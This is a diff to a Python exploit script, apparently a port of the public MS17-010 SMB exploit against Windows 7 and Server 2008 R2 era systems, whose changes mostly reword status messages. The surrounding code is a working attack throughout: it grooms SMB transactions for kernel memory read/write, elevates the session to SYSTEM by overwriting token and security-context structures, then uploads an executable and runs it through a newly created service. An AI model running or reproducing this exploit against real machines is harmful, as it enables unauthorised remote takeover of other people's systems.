@@ -641,7 +641,7 @@ def exploit_fish_barrel(conn, pipe_name, info):
     # ================================
     # sum of transaction name, parameters and data length is 0x1000
     # paramterCount = 0x100-TRANS_NAME_LEN
-    print('Groom packets')
+    print('[*] Grooming packets')
     trans_param = pack('<HH', info['fid'], 0)
     for i in range(12):
         mid = info['fid'] if i == 8 else next_extra_mid()
@@ -667,7 +667,7 @@ def exploit_fish_barrel(conn, pipe_name, info):
     # Note: POOL_ALIGN value is same as heap alignment value
     success = False
     for tinfo in attempt_list:
-        print('attempt controlling next transaction on ' + tinfo['ARCH'])
+        print('[*] Attempting to control next transaction on ' + tinfo['ARCH'])
         HEAP_CHUNK_PAD_SIZE = (tinfo['POOL_ALIGN'] - (tinfo['TRANS_SIZE'] + HEAP_HDR_SIZE) % tinfo['POOL_ALIGN']) % \
                               tinfo['POOL_ALIGN']
         NEXT_TRANS_OFFSET = 0xf00 - shift_indata_byte + HEAP_CHUNK_PAD_SIZE + HEAP_HDR_SIZE
@@ -681,18 +681,18 @@ def exploit_fish_barrel(conn, pipe_name, info):
         # a new transaction with special_mid should be error.
         recvPkt = conn.send_nt_trans(5, mid=special_mid, param=trans_param, data='')
         if recvPkt.getNTStatus() == 0x10002:  # invalid SMB
-            print('success controlling one transaction')
+            print('[+] The transaction is controlled')
             success = True
             if 'arch' not in info:
-                print('Target is ' + tinfo['ARCH'])
+                print('[*] Target is ' + tinfo['ARCH'])
                 info['arch'] = tinfo['ARCH']
                 info.update(OS_ARCH_INFO[info['os']][info['arch']])
             break
         if recvPkt.getNTStatus() != 0:
-            print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
+            print('[-] Unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
 
     if not success:
-        print('unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
+        print('[!] Unexpected return status: 0x{:x}'.format(recvPkt.getNTStatus()))
         print('!!! Write to wrong place !!!')
         print('the target might be crashed')
         return False
@@ -712,7 +712,7 @@ def exploit_fish_barrel(conn, pipe_name, info):
     #   with offset only,
     #   we also modify HIDWORD of InParameter to 0xffffffff.
 
-    print('modify parameter count to 0xffffffff to be able to write backward')
+    print('[*] Modifying parameter count to 0xffffffff to be able to write backward')
     conn.send_trans_secondary(mid=info['fid'], data='\xff' * 4,
                               dataDisplacement=NEXT_TRANS_OFFSET + info['TRANS_TOTALPARAMCNT_OFFSET'])
     # on 64 bit, modify InParameter last 4 bytes to \xff\xff\xff\xff too
@@ -739,7 +739,7 @@ def exploit_fish_barrel(conn, pipe_name, info):
     # ================================
     # leak transaction
     # ================================
-    print('leak next transaction')
+    print('[*] Leak next transaction')
     # modify TRANSACTION member to leak info
     # function=5 (NT_TRANS_RENAME)
     conn.send_trans_secondary(mid=info['fid'], data='\x05',
@@ -755,7 +755,7 @@ def exploit_fish_barrel(conn, pipe_name, info):
 
     # check heap chunk size value in leak data
     if unpack_from('<H', leakData, HEAP_CHUNK_PAD_SIZE)[0] != (TRANS_CHUNK_SIZE // info['POOL_ALIGN']):
-        print('chunk size is wrong')
+        print('[-] Chunk size is wrong')
         return False
 
     # extract leak transaction data and make next transaction to be trans2
@@ -780,7 +780,7 @@ def exploit_fish_barrel(conn, pipe_name, info):
     # ================================
     # modify trans struct to be used for arbitrary read/write
     # ================================
-    print('modify transaction struct for arbitrary read/write')
+    print('[*] Modifying transaction struct for arbitrary read/write')
     # modify
     # - trans1.InParameter to &trans1. so we can modify trans1 struct with itself (trans1 param)
     # - trans1.InData to &trans2. so we can modify trans2 with trans1 data
@@ -836,7 +836,7 @@ def create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount, userAndGroup
 
 
 def exploit(target, port, evil_file, pipe_name):
-    print('Trying to connect to %s:%d' % (target, port))
+    print('[*] Trying to connect to %s:%d' % (target, port))
     conn = MYSMB(target, port)
 
     # set NODELAY to make exploit much faster
@@ -844,9 +844,8 @@ def exploit(target, port, evil_file, pipe_name):
 
     info = {}
 
-    conn.login(USERNAME, PASSWORD, maxBufferSize=4356)
+    conn.login_or_fail(USERNAME, PASSWORD, maxBufferSize=4356)
     server_os = conn.get_server_os()
-    print('Target OS: ' + server_os)
     if server_os.startswith("Windows 7 ") or server_os.startswith("Windows Server 2008 R2"):
         info['os'] = 'WIN7'
         info['method'] = exploit_matched_pairs
@@ -874,15 +873,15 @@ def exploit(target, port, evil_file, pipe_name):
         info['arch'] = 'x86'
         info['method'] = exploit_fish_barrel
     else:
-        print('This exploit does not support this target')
+        print('[-] This exploit does not support this target: ' + str(info['os']))
         sys.exit()
 
     if pipe_name is None:
         pipe_name = find_named_pipe(conn)
-        if pipe_name is None:
-            print('Not found accessible named pipe')
+        if not pipe_name:
+            print('[-] Not found accessible named pipe')
             return False
-        print('Using named pipe: ' + pipe_name)
+        print('[+] Found a named pipe: ' + pipe_name)
 
     if not info['method'](conn, pipe_name, info):
         return False
@@ -893,9 +892,10 @@ def exploit(target, port, evil_file, pipe_name):
     # ================================
     fmt = info['PTR_FMT']
 
-    print('make this SMB session to be SYSTEM')
+    print('[*] Making this SMB session to be SYSTEM')
     # IsNullSession = 0, IsAdmin = 1
     write_data(conn, info, info['session'] + info['SESSION_ISNULL_OFFSET'], '\x00\x01')
+    print('[+] GOT SYSTEM!')
 
     # read session struct to get SecurityContext address
     sessionData = read_data(conn, info, info['session'], 0x100)
@@ -915,7 +915,7 @@ def exploit(target, port, evil_file, pipe_name):
 
         tokenAddrInfo = read_data(conn, info, pctxtDataAddr + info['PCTXTHANDLE_TOKEN_OFFSET'], 8)
         tokenAddr = unpack_from('<' + fmt, tokenAddrInfo)[0]
-        print('current TOKEN addr: 0x{:x}'.format(tokenAddr))
+        print('[+] Current TOKEN addr: 0x{:x}'.format(tokenAddr))
 
         # copy Token data for restoration
         tokenData = read_data(conn, info, tokenAddr, 0x40 * info['PTR_SIZE'])
@@ -925,7 +925,7 @@ def exploit(target, port, evil_file, pipe_name):
             get_group_data_from_token(
                         info, tokenData)
 
-        print('overwriting token UserAndGroups')
+        print('[*] Overwriting token UserAndGroups')
         # modify UserAndGroups info
         fakeUserAndGroupCount, fakeUserAndGroups = create_fake_SYSTEM_UserAndGroups(conn, info, userAndGroupCount,
                                                                                     userAndGroupsAddr)
@@ -937,7 +937,7 @@ def exploit(target, port, evil_file, pipe_name):
         # copy SecurityContext for restoration
         secCtxData = read_data(conn, info, secCtxAddr, info['SECCTX_SIZE'])
 
-        print('overwriting session security context')
+        print('[*] Overwriting session security context')
         # see FAKE_SECCTX detail at top of the file
         write_data(conn, info, secCtxAddr, info['FAKE_SECCTX'])
 
@@ -989,7 +989,7 @@ def validate_token_offset(info, tokenData, userAndGroupCountOffset, userAndGroup
     success = True
 
     if RestrictedSidCount != 0 or RestrictedSids != 0 or userAndGroupCount == 0 or userAndGroupsAddr == 0:
-        print('Bad TOKEN_USER_GROUP offsets detected while parsing tokenData!')
+        print('[!] Bad TOKEN_USER_GROUP offsets detected while parsing tokenData!')
         print('RestrictedSids: 0x{:x}'.format(RestrictedSids))
         print('RestrictedSidCount: 0x{:x}'.format(RestrictedSidCount))
         success = False
@@ -1038,7 +1038,7 @@ def send_and_execute(conn, arch, file_to_send):
     smbConn = conn.get_smbconnection()
 
     filename = "%s.exe" % random_generator(6)
-    print("Sending file %s..." % filename)
+    print("[*] Sending file %s..." % filename)
 
     # In some cases you should change remote file location
     # For example:
@@ -1069,7 +1069,7 @@ def service_exec(conn, cmd):
     rpcsvc.bind(scmr.MSRPC_UUID_SCMR)
     svcHandle = None
     try:
-        print("Opening SVCManager on %s....." % conn.get_remote_host())
+        print("[*] Opening SVCManager on %s....." % conn.get_remote_host())
         resp = scmr.hROpenSCManagerW(rpcsvc)
         svcHandle = resp['lpScHandle']
 
@@ -1084,7 +1084,7 @@ def service_exec(conn, cmd):
             scmr.hRDeleteService(rpcsvc, resp['lpServiceHandle'])
             scmr.hRCloseServiceHandle(rpcsvc, resp['lpServiceHandle'])
         os.path
-        print('Creating service %s.....' % service_name)
+        print('[*] Creating service %s.....' % service_name)
         resp = scmr.hRCreateServiceW(rpcsvc, svcHandle, service_name + '\x00', service_name + '\x00',
                                      lpBinaryPathName=cmd + '\x00')
         serviceHandle = resp['lpServiceHandle']
@@ -1092,7 +1092,7 @@ def service_exec(conn, cmd):
         if serviceHandle:
             # Start service
             try:
-                print('Starting service %s.....' % service_name)
+                print('[+] Starting service %s.....' % service_name)
                 scmr.hRStartServiceW(rpcsvc, serviceHandle)
             # is it really need to stop?
             # using command line always makes starting service fail because SetServiceStatus() does not get called
@@ -1101,11 +1101,11 @@ def service_exec(conn, cmd):
             except Exception as e:
                 print(str(e))
 
-            print('Removing service %s.....' % service_name)
+            print('[*] Removing service %s.....' % service_name)
             scmr.hRDeleteService(rpcsvc, serviceHandle)
             scmr.hRCloseServiceHandle(rpcsvc, serviceHandle)
     except Exception as e:
-        print("ServiceExec Error on: %s" % conn.get_remote_host())
+        print("[-] ServiceExec Error on: %s" % conn.get_remote_host())
         print(str(e))
     finally:
         if svcHandle:
